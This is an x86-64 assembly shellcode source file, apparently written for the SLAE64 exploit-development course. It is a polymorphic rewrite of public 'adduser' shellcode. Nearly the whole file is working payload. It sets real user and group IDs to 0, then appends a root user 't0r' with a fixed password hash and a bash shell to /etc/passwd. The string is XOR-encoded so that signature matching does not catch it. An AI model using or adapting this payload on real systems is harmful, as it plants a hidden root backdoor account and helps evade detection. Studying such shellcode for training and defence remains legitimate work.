;
; sc_adduser
;
; Original Author: 	0_o -- null_null
;		null.null [at] yahoo.com
; Original URL:		http://www.shell-storm.org/shellcode/files/shellcode-801.php
; Date:			2012-03-05
;
; Polymorph'd by Gitsnik SLAE64-1232
;
; Original Size: 189 bytes
; Polymorph Size: 137 bytes
;
; 21/56 lines same (37.5%)
;
; I do not feel that this is within the spirit of the discussion
; as I have left the password strings untouched and just written
; more efficient code for the other function calls. I have also
; not removed 0x0a and 0x0d values from the resulting shellcode.
;
; With manipulation and modification of the strings where possible
; the match up becomes:
;
; Original Size: 189 bytes
; Polymorph Size: 157 bytes
;
; 6/56 lines same (10.71%) - And they're all syscalls. Total Polymorph.
;
; This total polymorph is what I have presented to you.
;

bits 64
global _start

section .text

_start:
	;
	; sys_setreuid( uint ruid, uint euid )
	;
	; Polymorph is total for this function block, excepting the 1 line
	; call to syscall
	;
	; Success call returns 0 into RAX
	;
	xor rcx, rcx
	mul rcx

	push rcx
	push rcx
	pop rsi
	pop rdi

	add al, 0x71
	syscall		; same

	;
	; sys_setregid( uint rgid, uint egid )
	;
	; Polymorph is total for this function block as we use add
	; instead of mov, and are ignoring the other lines as they are
	; useless considering they were previously set or corrected.
	;
	add al, 0x72
	syscall		; same

	;
	; save the string to the stack.
	; t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash\n\00/etc/passwd\00
	; This is the t0r user with password, and the file name.
	;
	; sys_open will need rdi to be a pointer to the file name
	; sys_write will need rsi to be a pointer to the string.
	; However sys_open needs rsi for its flags argument, so we will
	; just push the data and see what happens ;)
	;
	; A note on optimisation. We've cut some bytes out here
	; and *technically* polymorph'd the resulting code because
	; we've just replaced /etc/passwd\00 with /etc//passwd
	;
	; A couple of extra xor commands would nearly double this
	; code block size and completely remove the similar patterns
	; from the string.
	;
	mov ecx, 0x64777373
	push rcx

	mov rcx, 0x61702f2f6374652f
	push rcx

	; There's /etc/passwd with a null on the end courtesy shr.
	; Let's save it to rdi
	mov rdi, rsp

	;
	; Now the password string. Because it would not generate
	; enough of a polymorph (for myself) to just extend the
	; line with some excess guff, we will do a simple xor
	; "decrypt" of each line. This will not decrease code
	; size because we will be replacing all the mov's with xor's
	;
	; Throughout this code block - RCX will be what we push 
	; purely to differentiate from previous code, RBX will contain
	; the key to XOR with.
	;

	;
	; Now get started on the string.
	;
	; 0x61702f2f6374652f xor 0x617a475c02164a41 = 0x000A687361622F6E
	; and we can skip the shr rbx, 0x08
	; 
	mov rbx, 0x617a475c02164a41
	xor rcx, rbx
	push rcx

	;
	; 0x000A687361622F6E xor 0x69684749150d401c = 0x69622F3A746F6F72
	;
	mov rbx, 0x69684749150d401c
	xor rcx, rbx
	push rcx

	;
	; 0x69622F3A746F6F72 xor 0x4658150a4e5f5515 = 0x2F3A3A303A303A67
	;
	; BAD because we have 0a in there.
	; So we:
	;
	; (0x69622f4a746f6f72 xor 0x2323232323232323) xor 0x0c19191319131944 = 0x2F3A3A303A303A67
	;
	mov rbx, 0x4a410c19574c4c51
	xor rcx, rbx
	mov rbx, 0x0c19191319131944
	xor rcx, rbx
	push rcx

	;
	; 0x2F3A3A303A303A67 xor 0x696f516571684e52 = 0x46556B554B587435
	;
	mov rbx, 0x696f516571684e52
	xor rcx, rbx
	push rcx

	;
	; 0x46556B554B587435 xor 0x12323e66712a4441 = 0x546755333A723074
	mov rbx, 0x12323e66712a4441
	xor rcx, rbx
	push rcx

	push rsp

	;
	; sys_open( char* fname, int flags, int mode )
	;
	; Note that the xor rsi, rsi is only here because it appears
	; that the original author never included it. Pre-seeding the
	; registers causes rsi to have other values here. I'd rather
	; see it cleaner.
	;
	; RDI contains its variable because of earlier.
	;
	xor rsi, rsi
	add si, 0x0401

	add al, 0x02	; Recall that set_regid returned 0 into RAX
	syscall		; same

	;
	; sys_write( uint fd, char* buf, uint size)
	;
	; RAX will contain the sys_open FD at this point, and it needs
	; to be in RDI. RSI contains our flags argument from sys_open
	; RDI contains our pointer to /etc/passwd.
	;
	xchg rax, rdi
	push byte 0x01
	pop rax
	pop rsi
	add dl, 0x27
	syscall		; same

	;
	; sys_close( uint fd )
	;
	; RDI already contains the fd from sys_write() so all we need
	; to do is clean up RAX and syscall.
	;
	push byte 0x03
	pop rax
	syscall		; same

	;
	; sys_exit( int err_code )
	;
	add al, 0x3c
	xor rdi, rdi
	syscall		; same

